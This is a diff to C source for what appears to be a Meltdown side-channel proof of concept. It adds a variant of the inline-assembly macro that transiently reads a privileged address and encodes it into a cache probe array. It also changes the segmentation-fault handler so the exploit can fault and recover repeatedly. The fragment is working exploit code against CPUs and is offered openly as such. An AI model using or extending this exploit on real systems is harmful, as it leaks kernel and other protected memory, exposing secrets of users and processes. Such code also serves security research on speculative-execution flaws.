@@ -9,15 +9,26 @@
  
   NOTE: Must be an array of INTEGERS!!! NOT CHARS LIKE IN THE ORIGINAL PAPER
 */
+
+#if NULL_IGNORED
 #define MELTDOWN(addr) \
   asm("1:\n movzx (%%rcx), %%rax\n" \
       "shl $14, %%rax\n" \
-      "jz 1b\n" \
+      "movq (%%rax, %%rbx, 1), %%rbx\n" \ 
+      :						\
+      : "c"(addr), "b"(rec)			\
+      : "rax");
+#else
+#define MELTDOWN(addr) \
+  asm("1:\n movzx (%%rcx), %%rax\n" \
+      "shl $14, %%rax\n" \
+      "jz 1b\n"					\
       "movq (%%rax, %%rbx, 1), %%rbx\n" \ 
       :						\
       : "c"(addr), "b"(rec)			\
       : "rax");
 
+#endif
 
 /*
   Global vars 
@@ -90,7 +101,13 @@ void meltdown_init() {
 /*
   Seg fault handler
  */
-static void meltdown_seg_handler(int sig, siginfo_t *info, void* context) {  
+static void meltdown_seg_handler(int sig, siginfo_t *info, void* context) {
+  // unblock signal
+  sigset_t sigs;
+  sigemptyset(&sigs);
+  sigaddset(&sigs, SIGSEGV);
+  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
+
   // jump back to faulting instruction
   longjmp(jmp_buffer, 1); 
 }
